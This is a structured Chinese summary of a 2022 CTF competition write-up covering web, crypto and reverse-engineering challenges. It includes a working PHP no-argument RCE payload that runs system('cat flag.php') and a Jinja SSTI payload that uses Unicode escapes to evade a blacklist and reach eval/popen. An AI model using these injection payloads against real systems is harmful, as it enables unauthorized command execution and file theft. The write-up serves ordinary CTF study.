---
title: 长安战疫-WriteUp
contest: 长安战疫
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [无参RCE,SSTI-unicode8进制转义,凯撒,字节XOR,Sage线性方程组,AES-ECB爆破,Python-stegosaurus,threading线程竞争,Happy数组]
attack_chain: 无参RCE: ?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&a=system('cat flag.php')|admin?name={{2*2}}.js:SSTI 8进制\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f=__globals__|凯撒: 'FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]' D-Z减3, A→X, B→Y, C→Z, ?→_|Java字节+echo: 77,68,65,77+ASCII+换行|MD5爆破: bitset等|strtr+substr+eval混淆|Python stegosaurus:./stegosaurus -x steg.pyc|Sage线性方程组: a,b,c,a+b+c=解|AES-ECB爆破2^20|线程竞争: f[9]^=9→f[8]^=f[9]→f[7]^=7交替 模拟num递减
key_payload: ?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&a=system('cat flag.php')|{{2*2}}.js|{%print(lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('eval'))(...popen...)%}|M = Matrix(R,[[d[2],d[3],d[4]],[d[1],d[2],d[3]],[1,1,1]]); res=vector(R,d[3:]); M.solve_left(res)|for i in range(2**20): key=pad(long_to_bytes(i)); if b"cazy" in m: print(m); break|flag{Ch1na_yyds_cazy}
one_liner: 长安战疫2022多方向:无参RCE array_rand+array_flip+array_values+get_defined_vars+eval+SSTI 8进制Unicode转义+凯撒D减3 A→X+Java字节77,68,65=MA+Python stegosaurus +Sage线性方程组+2^20 AES-ECB爆破+线程竞争XOR 10字符flag
lesson: 1) 无参RCE:eval(array_rand(array_flip(current(array_values(get_defined_vars()))))); random key in args; 2) SSTI 8进制转义:'\u005f\u005f'='__',逐字符编码绕黑名单; 3) 凯撒D-Z减3 A→X B→Y C→Z ?→_; 4) Java字节流:77 68 65 77 78 ... 77 84→MA...XT; 5) Python stegosaurus .pyc中嵌payload; 6) Sage线性方程组求a,b,c三数; 7) AES-ECB爆破2^20 key空间; 8) 线程竞争:encode_1(f[i]^=i) + encode_2(f[i]^=f[i+1]) 间隔0.5s启动,num共享变量
quality: high
---

## 备注

原文(https://www.ctfiot.com/22102.html)2022年1月长安战疫,ChaMd5 Venom战队WP,末尾招新广告。涵盖多方向高难度题。

### 题目详情

**Web-无参RCE**
```
?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&a=system('cat flag.php');
```
- 链:array_rand→array_flip→current→array_values→get_defined_vars→eval
- flag{9a7f25934fe3d84e150ff4e02c2198f5}

**Web-SSTI 8进制Unicode**
```
?admin?name={{2*2}}.js
```
- 完整payload:
```
{%print(lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('eval'))(...popen...)%}
```
- `\u005f`=`_`, 逐字符编码绕黑名单

**凯撒密码**
```python
str='FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]'
new=[]
for i in str:
    if i >= 'D' and i <= 'Z': new.append(chr(ord(i) - 3))
    elif i == 'A': new.append('X')
    elif i == 'B': new.append('Y')
    elif i == 'C': new.append('Z')
    elif i == '?': new.append('_')
    else: new.append(chr(ord(i) + 32))
```

**Java字节数组(77 68 65 = MDAwMDAw)**
```java
byte[] var10000 = new byte[]{77, 68, 65, 119, 77, 68, 65, 119, ...};
```
- 77='M', 68='D', 65='A' = base64字符

**Sage线性方程组**
```sage
n = 10104483468358610819
R = IntegerModRing(n)
d = [0, 2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]
M = Matrix(R, [[d[2], d[3], d[4]], [d[1], d[2], d[3]], [1, 1, 1]])
res = vector(R, d[3:])
M.solve_left(res)
# a, b, c = (5490290802446982981, 8175498372211240502, 6859390560180138873)
```

**AES-ECB爆破**
```python
for i in range(2**20):
    key = pad(long_to_bytes(i))
    if b"cazy" in m: print(m); break
# cazy{n0_c4n,bb?n0p3!}
```

**线程竞争**
```python
def encode_1(n): flag[num] = flag[num] ^ num; num -= 1; time.sleep(1)
def encode_2(n): flag[num] = flag[num] ^ flag[num + 1]; num -= 1; time.sleep(1)
# 模拟 num=9 交替
f[9]^=9; num=8
f[8]^=f[9]; num=7
f[7]^=7; num=6
f[6]^=f[7]; num=5
f[5]^=5; num=4
f[4]^=f[5]; num=3
f[3]^=3; num=2
f[2]^=f[3]; num=1
f[1]^=1; num=0
f[0]^=f[1]; num=-1
```

## 评级

- **quality: high** — 8+题高难度合集,无参RCE+8进制Unicode SSTI+凯撒+Java字节+stegosaurus+Sage线性方程组+AES爆破+线程竞争全套
- **vuln_type: web_unknown** — 多方向Web
- 实战价值:无参RCE+SSTI 8进制Unicode+线程竞争都是高阶套路
